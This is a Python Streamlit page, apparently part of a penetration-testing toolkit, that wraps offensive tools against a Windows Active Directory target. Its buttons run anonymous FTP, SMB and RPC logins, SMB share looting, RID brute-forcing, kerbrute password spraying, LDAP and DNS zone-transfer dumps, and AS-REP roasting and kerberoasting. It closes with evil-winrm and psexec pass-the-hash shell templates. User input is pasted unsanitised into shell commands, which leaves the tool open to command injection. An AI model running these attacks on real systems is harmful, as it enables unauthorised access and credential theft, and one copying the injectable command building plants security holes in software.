import streamlit as st
import subprocess
from utils import *
import os



st.set_page_config(page_title="info_gather")

css='''
<style>
    section.main > div {max-width:70rem}
</style>
'''
st.markdown(css, unsafe_allow_html=True)

st.sidebar.markdown("**Current Target IP** :  "+st.session_state.ip)
st.sidebar.markdown("**Current Target Domian** :  "+st.session_state.domain)
st.sidebar.markdown("# Info_Gather")
st.sidebar.markdown("From the services that target runs, run different scripts to gather username and password")
st.sidebar.markdown('''
    - ftp
    - smb 
    - kerberos
    - rpc
    - ldap
    - dns
    - asrep roasting
    - kerberoast no_preauth
    - ShellConnect
    ''')
st.session_state.show_command = st.sidebar.checkbox("Show command", True)

st.title("ftp")
if st.button("ftp_Execute"):
    if st.session_state.ip:
        command = "ftp ftp://anonymous:anonymous@{}".format(st.session_state.ip)
        run_command(command )
        show_command(command)
    else:
        warning("missing","ip")


st.title("smb")
if st.button("Anonymous login"):
    if st.session_state.ip:
        command = "smbclient -N -L \\\\"+st.session_state.ip
        run_command(command )
        show_command(command)
    else:
        warning("missing","ip")
smb01_col1, smb01_col2 = st.columns(2)
with smb01_col1:
    smb_username  = st.text_input("smb_user", "")
with smb01_col2:
    smb_password = st.text_input("smb_password", "")
all_path = st.text_input("smb path","")

coll1, coll2 = st.columns(2)
with coll1:
    smb_path_list = st.button("smb path list")
with coll2:
    smb_file_get = st.button("smb directory all files get")
if smb_path_list or smb_file_get:
    if all_path:
        if all_path[-1] is '\\':
            all_path = all_path[:-2]
        path  = all_path.split("\\")
        smb_path = "\\".join(path[1:])
        first_path = path[0]
    if st.session_state.ip:
        if smb_path_list:
            command = "smbclient //{}/{} -U '{}' --password '{}' -c 'cd {};dir'".format(st.session_state.ip,first_path,smb_username,smb_password,smb_path)
        if smb_file_get:
            if not os.path.exists("./winhack/smbfiles/{}".format(path[-1])):
                os.system("cd ./winhack/smbfiles/; mkdir {}".format(path[-1]))
            command = "cd ./winhack/smbfiles/{} ; smbclient //{}/{} -U '{}' --password '{}' -c 'cd {};recurse;prompt;mget *;exit'".format(path[-1],st.session_state.ip,first_path,smb_username,smb_password,smb_path)
            st.info("Get file to ./winhack/smbfiles/{}".format(path[-1]))
        run_command(command )
        show_command(command)
    
    else:
        warning("missing","ip")
    

smb_user = st.text_input("rid-brute smb user: (guest for fault)","guest")
if st.button("rid-brute smb user"):
    if st.session_state.ip:
        command = "crackmapexec smb {} -u '{}' -p '' --shares --rid-brute 10000".format(st.session_state.ip,smb_user)
        run_command(command )
        show_command(command)
    else:
        warning("missing","ip")
smb_col1, smb_col2 = st.columns(2)
with smb_col1:
    smb_username  = st.text_input("smb_username_file", "./winhack/user")
with smb_col2:
    smb_password = st.text_input("smb_password_file", "./winhack/password")
if st.button("smb user auth check"):
    if st.session_state.ip and smb_username and smb_password:
        command = "crackmapexec smb {} -u {} -p {} --continue-on-success".format(st.session_state.ip,smb_username,smb_password)
        run_command(command )
        show_command(command)
    else:
        warning("missing","ip")


st.title("kerberos userenum")
brute_username_file = st.text_input("kerberos user brute:","/usr/share/SecLists/Usernames/cirt-default-usernames.txt")
if st.button("user brute"):
    if st.session_state.ip and st.session_state.domain and brute_username_file:
        command = "kerbrute_linux_amd64 userenum --dc {} -d {} {}".format(st.session_state.ip,st.session_state.domain,brute_username_file)
        run_command(command )
        show_command(command)
    else:
        if not st.session_state.ip:
            warning("missing","ip")
        if not st.session_state.domain:
            warning("missing","domain")
        if not brute_username_file:
            warning("missing","username wordlist")
kerberos_col1, kerberos_col2 = st.columns(2)
with kerberos_col1:
    ker_username_file  = st.text_input("ker_username_file", "./winhack/user")
with kerberos_col2:
    ker_password_file  = st.text_input("ker_password_file", "./winhack/password")
f = open(ker_password_file,"r")
ker_passwords = f.readlines()
if st.button("user check"):
    for ker_password in ker_passwords:
            if ker_username_file and ker_password and st.session_state.ip and st.session_state.domain:
                command = "kerbrute_linux_amd64 passwordspray --dc {} -d {} {} '{}'".format(st.session_state.ip,st.session_state.domain,ker_username_file,ker_password.replace("\n",""))
                run_command(command )
                show_command(command)
            else:
                if not st.session_state.ip:
                    warning("missing","ip")
                if not st.session_state.domain:
                    warning("missing","domain")
                if not ker_username_file:
                    warning("missing","usernam file")

st.title("rpc login without password")
if st.button("rpc_Execute"):
    if st.session_state.ip:
        command = 'rpcclient -U "" {} -c "enumdomusers" --no-pass;rpcclient -U "" {} -c "querydispinfo" --no-pass'.format(st.session_state.ip,st.session_state.ip)
        run_command(command )
        show_command(command)
    else:
        warning("missing","ip")

st.title("ldap")
if st.button("ldap_user_enum"):
    if st.session_state.ip and st.session_state.domain:
        dc_string = DC_format(st.session_state.domain)
        command = "ldapsearch -x -b \"{}\"  -H ldap://{}".format(dc_string,st.session_state.ip)
        run_command(command )
        show_command(command)
    else:
        if not st.session_state.ip:
            warning("missing","ip")
        if not st.session_state.domain:
            warning("missing","domain")
ldap_col1, ldap_col2 = st.columns(2)
with ldap_col1:
    ldap_username  = st.text_input("ldap_username_file", "./winhack/user")
with ldap_col2:
    ldap_password = st.text_input("ldap_password_file", "./winhack/password")
if st.button("ldap user auth check"):
    if ldap_username and ldap_password:
        command = "crackmapexec ldap {} -u {} -p {} --continue-on-success".format(st.session_state.ip,ldap_username,ldap_password)
        run_command(command )
        show_command(command)
    else:
        if not st.session_state.ip:
            warning("missing","ip")
        if not st.session_state.domain:
            warning("missing","domain")

st.title("dns")
if st.button("dns_dig"):
    if st.session_state.ip and st.session_state.domain:
        command = "dig axfr @{} {}".format(st.session_state.ip,st.session_state.domain)
        run_command(command )
        show_command(command)
    else:
        if not st.session_state.ip:
            warning("missing","ip")
        if not st.session_state.domain:
            warning("missing","domain")

st.title("asrep roasting")
user_list = st.text_input("user_list","./winhack/user")
option = st.selectbox('hash format',('john', 'hashcat'))
if st.button("run asrep roasting"):
    if st.session_state.ip and st.session_state.domain and user_list:
        command = "GetNPUsers.py -dc-ip {} {}/ -users {} -request -format {}".format(st.session_state.ip,st.session_state.domain,user_list,option)
        run_command(command )
        show_command(command)
    else:
        if not st.session_state.ip:
            warning("missing","ip")
        if not st.session_state.domain:
            warning("missing","domain")

st.title("kerberoast no_preauth")
ker_no_preauth_col1, ker_no_preauth_col2 = st.columns(2)
with ker_no_preauth_col1:
    user_list  = st.text_input("user_list ","./winhack/user")
with ker_no_preauth_col2:
    no_preauth_user = st.text_input("no_preauth_user:", "")
if st.button("run kerberoast no_preauth exploit"):
    if st.session_state.ip and no_preauth_user and user_list and st.session_state.domain:
        command = "GetUserSPNs.py -no-preauth {} -usersfile {} -dc-host {} {}/ -request".format(no_preauth_user,user_list,st.session_state.ip,st.session_state.domain)
        run_command(command )
        show_command(command)
    else:
        if not st.session_state.ip:
            warning("missing","ip")
        if not st.session_state.domain:
            warning("missing","domain")
        if not no_preauth_user:
            warning("missing","no_preauth user")


st.title("ShellConnect")
st.info('''
    evil-winrm -u [user] -p [password] -i [ip]:n
    psexec.py [domain]/[username]@[ip]:n
    psexec.py -hashes [LMHASH\:NTHASH] -dc-ip [ip] [username]@[ip]
    ''')